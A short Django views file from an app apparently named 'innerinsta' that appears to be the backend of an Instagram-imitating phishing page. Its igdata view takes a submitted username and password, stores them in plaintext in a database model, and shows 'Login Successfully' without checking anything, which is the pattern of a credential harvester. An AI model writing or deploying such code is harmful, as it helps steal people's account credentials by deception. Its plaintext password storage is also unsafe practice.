from django.shortcuts import render
from innerinsta.models import data 
# Create your views here.

def insta(request):
    return render(request, 'index.html')

def igdata(request):
     n=''
     if request.method=="POST":
        username=request.POST.get('username')
        password=request.POST.get('password')
        en=data(username=username,password=password)
        en.save()
        n='Login Successfully'
     return render(request ,'index.html',{'n':n})    